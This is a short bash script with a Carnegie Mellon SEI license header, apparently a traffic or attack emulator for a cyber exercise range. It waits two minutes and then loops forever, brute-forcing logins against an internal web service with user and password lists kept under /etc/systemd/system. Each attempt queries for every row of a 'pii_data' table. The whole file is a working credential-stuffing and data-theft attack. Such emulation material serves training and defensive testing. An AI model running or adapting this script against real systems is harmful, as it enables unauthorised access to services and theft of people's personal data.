#!/bin/bash

# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.


sleep 120

while true
do
	while read -r a; do
		while read -r b; do
			curl -u $a:$b "http://10.1.1.11:5001/query?query=SELECT%20*%20FROM%20pii_data"
		done < /etc/systemd/system/passwordlist.txt
	done < /etc/systemd/system/userlist.txt
done
